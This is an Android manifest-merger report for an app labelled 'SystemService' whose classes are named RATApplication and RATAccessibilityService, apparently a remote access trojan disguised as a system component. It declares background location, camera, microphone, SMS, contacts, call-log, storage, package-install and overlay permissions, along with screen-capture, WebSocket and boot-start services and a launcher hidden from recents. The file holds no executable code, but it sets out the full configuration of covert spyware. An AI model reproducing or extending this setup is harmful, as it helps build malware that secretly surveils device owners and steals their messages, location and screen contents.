app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.android.systemservice"
4    android:versionCode="1"
5    android:versionName="3.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="26"
9        android:targetSdkVersion="34" />
10
11    <!-- Network -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
14-->src/main/AndroidManifest.xml:8:5-76
14-->src/main/AndroidManifest.xml:8:22-73
15
16    <!-- Location -->
17    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
17-->src/main/AndroidManifest.xml:11:5-79
17-->src/main/AndroidManifest.xml:11:22-76
18    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
18-->src/main/AndroidManifest.xml:12:5-81
18-->src/main/AndroidManifest.xml:12:22-78
19    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
19-->src/main/AndroidManifest.xml:13:5-85
19-->src/main/AndroidManifest.xml:13:22-82
20
21    <!-- Camera & Media -->
22    <uses-permission android:name="android.permission.CAMERA" />
22-->src/main/AndroidManifest.xml:16:5-65
22-->src/main/AndroidManifest.xml:16:22-62
23    <uses-permission android:name="android.permission.RECORD_AUDIO" />
23-->src/main/AndroidManifest.xml:17:5-71
23-->src/main/AndroidManifest.xml:17:22-68
24
25    <!-- SMS & Contacts -->
26    <uses-permission android:name="android.permission.READ_SMS" />
26-->src/main/AndroidManifest.xml:20:5-67
26-->src/main/AndroidManifest.xml:20:22-64
27    <uses-permission android:name="android.permission.SEND_SMS" />
27-->src/main/AndroidManifest.xml:21:5-67
27-->src/main/AndroidManifest.xml:21:22-64
28    <uses-permission android:name="android.permission.READ_CONTACTS" />
28-->src/main/AndroidManifest.xml:22:5-72
28-->src/main/AndroidManifest.xml:22:22-69
29    <uses-permission android:name="android.permission.READ_CALL_LOG" />
29-->src/main/AndroidManifest.xml:23:5-72
29-->src/main/AndroidManifest.xml:23:22-69
30
31    <!-- Foreground Service -->
32    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
32-->src/main/AndroidManifest.xml:26:5-77
32-->src/main/AndroidManifest.xml:26:22-74
33    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
33-->src/main/AndroidManifest.xml:27:5-87
33-->src/main/AndroidManifest.xml:27:22-84
34    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
34-->src/main/AndroidManifest.xml:28:5-94
34-->src/main/AndroidManifest.xml:28:22-91
35
36    <!-- Boot -->
37    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
37-->src/main/AndroidManifest.xml:31:5-81
37-->src/main/AndroidManifest.xml:31:22-78
38
39    <!-- Notifications -->
40    <uses-permission
40-->src/main/AndroidManifest.xml:34:5-35:38
41        android:name="android.permission.POST_NOTIFICATIONS"
41-->src/main/AndroidManifest.xml:34:22-74
42        android:maxSdkVersion="32" />
42-->src/main/AndroidManifest.xml:35:9-35
43
44    <!-- Storage -->
45    <uses-permission
45-->src/main/AndroidManifest.xml:38:5-39:38
46        android:name="android.permission.READ_EXTERNAL_STORAGE"
46-->src/main/AndroidManifest.xml:38:22-77
47        android:maxSdkVersion="29" />
47-->src/main/AndroidManifest.xml:39:9-35
48    <uses-permission
48-->src/main/AndroidManifest.xml:40:5-41:38
49        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
49-->src/main/AndroidManifest.xml:40:22-78
50        android:maxSdkVersion="29" />
50-->src/main/AndroidManifest.xml:41:9-35
51    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
51-->src/main/AndroidManifest.xml:42:5-43:40
51-->src/main/AndroidManifest.xml:42:22-79
52
53    <!-- System -->
54    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
54-->src/main/AndroidManifest.xml:46:5-83
54-->src/main/AndroidManifest.xml:46:22-80
55    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
55-->src/main/AndroidManifest.xml:47:5-85
55-->src/main/AndroidManifest.xml:47:22-82
56    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
56-->src/main/AndroidManifest.xml:48:5-78
56-->src/main/AndroidManifest.xml:48:22-75
57    <uses-permission android:name="android.permission.VIBRATE" />
57-->src/main/AndroidManifest.xml:49:5-66
57-->src/main/AndroidManifest.xml:49:22-63
58    <uses-permission android:name="android.permission.FLASHLIGHT" />
58-->src/main/AndroidManifest.xml:50:5-69
58-->src/main/AndroidManifest.xml:50:22-66
59    <uses-permission android:name="android.permission.WAKE_LOCK" />
59-->src/main/AndroidManifest.xml:51:5-68
59-->src/main/AndroidManifest.xml:51:22-65
60    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
60-->src/main/AndroidManifest.xml:52:5-53:53
60-->src/main/AndroidManifest.xml:52:22-74
61    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
61-->src/main/AndroidManifest.xml:54:5-79
61-->src/main/AndroidManifest.xml:54:22-76
62
63    <permission
63-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
64        android:name="com.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
64-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
65        android:protectionLevel="signature" />
65-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
66
67    <uses-permission android:name="com.android.systemservice.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
67-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
67-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
68
69    <application
69-->src/main/AndroidManifest.xml:56:5-114:19
70        android:name="com.mycontrol.mdm.RATApplication"
70-->src/main/AndroidManifest.xml:57:9-39
71        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
71-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
72        android:debuggable="true"
73        android:extractNativeLibs="false"
74        android:icon="@mipmap/ic_launcher"
74-->src/main/AndroidManifest.xml:58:9-43
75        android:label="SystemService"
75-->src/main/AndroidManifest.xml:59:9-38
76        android:networkSecurityConfig="@xml/network_security_config"
76-->src/main/AndroidManifest.xml:61:9-69
77        android:supportsRtl="true"
77-->src/main/AndroidManifest.xml:62:9-35
78        android:theme="@style/Theme.Material.NoActionBar.Fullscreen"
78-->src/main/AndroidManifest.xml:60:9-69
79        android:usesCleartextTraffic="true" >
79-->src/main/AndroidManifest.xml:63:9-44
80
81        <!-- MainActivity -->
82        <activity
82-->src/main/AndroidManifest.xml:67:9-77:20
83            android:name="com.mycontrol.mdm.MainActivity"
83-->src/main/AndroidManifest.xml:68:13-41
84            android:excludeFromRecents="true"
84-->src/main/AndroidManifest.xml:71:13-46
85            android:exported="true"
85-->src/main/AndroidManifest.xml:69:13-36
86            android:noHistory="true"
86-->src/main/AndroidManifest.xml:72:13-37
87            android:theme="@style/Theme.Material.NoActionBar.Fullscreen" >
87-->src/main/AndroidManifest.xml:70:13-73
88            <intent-filter>
88-->src/main/AndroidManifest.xml:73:13-76:29
89                <action android:name="android.intent.action.MAIN" />
89-->src/main/AndroidManifest.xml:74:17-69
89-->src/main/AndroidManifest.xml:74:25-66
90
91                <category android:name="android.intent.category.LAUNCHER" />
91-->src/main/AndroidManifest.xml:75:17-77
91-->src/main/AndroidManifest.xml:75:27-74
92            </intent-filter>
93        </activity>
94
95        <!-- ✅ WebSocketService (SocketService ተተክቷል) -->
96        <service
96-->src/main/AndroidManifest.xml:80:9-83:56
97            android:name="com.mycontrol.mdm.services.WebSocketService"
97-->src/main/AndroidManifest.xml:81:13-54
98            android:exported="false"
98-->src/main/AndroidManifest.xml:82:13-37
99            android:foregroundServiceType="dataSync" />
99-->src/main/AndroidManifest.xml:83:13-53
100
101        <!-- ScreenCaptureService -->
102        <service
102-->src/main/AndroidManifest.xml:86:9-89:63
103            android:name="com.mycontrol.mdm.services.ScreenCaptureService"
103-->src/main/AndroidManifest.xml:87:13-58
104            android:exported="false"
104-->src/main/AndroidManifest.xml:88:13-37
105            android:foregroundServiceType="mediaProjection" />
105-->src/main/AndroidManifest.xml:89:13-60
106
107        <!-- AccessibilityService -->
108        <service
108-->src/main/AndroidManifest.xml:92:9-102:19
109            android:name="com.mycontrol.mdm.services.RATAccessibilityService"
109-->src/main/AndroidManifest.xml:93:13-61
110            android:exported="true"
110-->src/main/AndroidManifest.xml:94:13-36
111            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
111-->src/main/AndroidManifest.xml:95:13-79
112            <intent-filter>
112-->src/main/AndroidManifest.xml:96:13-98:29
113                <action android:name="android.accessibilityservice.AccessibilityService" />
113-->src/main/AndroidManifest.xml:97:17-92
113-->src/main/AndroidManifest.xml:97:25-89
114            </intent-filter>
115
116            <meta-data
116-->src/main/AndroidManifest.xml:99:13-101:72
117                android:name="android.accessibilityservice"
117-->src/main/AndroidManifest.xml:100:17-60
118                android:resource="@xml/accessibility_service_config" />
118-->src/main/AndroidManifest.xml:101:17-69
119        </service>
120
121        <!-- BootReceiver -->
122        <receiver
122-->src/main/AndroidManifest.xml:105:9-112:20
123            android:name="com.mycontrol.mdm.services.BootReceiver"
123-->src/main/AndroidManifest.xml:106:13-50
124            android:exported="true" >
124-->src/main/AndroidManifest.xml:107:13-36
125            <intent-filter>
125-->src/main/AndroidManifest.xml:108:13-111:29
126                <action android:name="android.intent.action.BOOT_COMPLETED" />
126-->src/main/AndroidManifest.xml:109:17-79
126-->src/main/AndroidManifest.xml:109:25-76
127                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
127-->src/main/AndroidManifest.xml:110:17-82
127-->src/main/AndroidManifest.xml:110:25-79
128            </intent-filter>
129        </receiver>
130
131        <activity
131-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:20:9-22:45
132            android:name="com.google.android.gms.common.api.GoogleApiActivity"
132-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:20:19-85
133            android:exported="false"
133-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:22:19-43
134            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
134-->[com.google.android.gms:play-services-base:18.1.0] AndroidManifest.xml:21:19-78
135
136        <meta-data
136-->[com.google.android.gms:play-services-basement:18.1.0] AndroidManifest.xml:21:9-23:69
137            android:name="com.google.android.gms.version"
137-->[com.google.android.gms:play-services-basement:18.1.0] AndroidManifest.xml:22:13-58
138            android:value="@integer/google_play_services_version" />
138-->[com.google.android.gms:play-services-basement:18.1.0] AndroidManifest.xml:23:13-66
139
140        <provider
140-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
141            android:name="androidx.startup.InitializationProvider"
141-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
142            android:authorities="com.android.systemservice.androidx-startup"
142-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
143            android:exported="false" >
143-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
144            <meta-data
144-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
145                android:name="androidx.emoji2.text.EmojiCompatInitializer"
145-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
146                android:value="androidx.startup" />
146-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
147            <meta-data
147-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:29:13-31:52
148                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
148-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:30:17-78
149                android:value="androidx.startup" />
149-->[androidx.lifecycle:lifecycle-process:2.7.0] AndroidManifest.xml:31:17-49
150            <meta-data
150-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:29:13-31:52
151                android:name="androidx.profileinstaller.ProfileInstallerInitializer"
151-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:30:17-85
152                android:value="androidx.startup" />
152-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:31:17-49
153        </provider>
154
155        <receiver
155-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:34:9-52:20
156            android:name="androidx.profileinstaller.ProfileInstallReceiver"
156-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:35:13-76
157            android:directBootAware="false"
157-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:36:13-44
158            android:enabled="true"
158-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:37:13-35
159            android:exported="true"
159-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:38:13-36
160            android:permission="android.permission.DUMP" >
160-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:39:13-57
161            <intent-filter>
161-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:40:13-42:29
162                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
162-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:17-91
162-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:41:25-88
163            </intent-filter>
164            <intent-filter>
164-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:43:13-45:29
165                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
165-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:17-85
165-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:44:25-82
166            </intent-filter>
167            <intent-filter>
167-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:46:13-48:29
168                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
168-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:17-88
168-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:47:25-85
169            </intent-filter>
170            <intent-filter>
170-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:49:13-51:29
171                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
171-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:17-95
171-->[androidx.profileinstaller:profileinstaller:1.3.0] AndroidManifest.xml:50:25-92
172            </intent-filter>
173        </receiver>
174    </application>
175
176</manifest>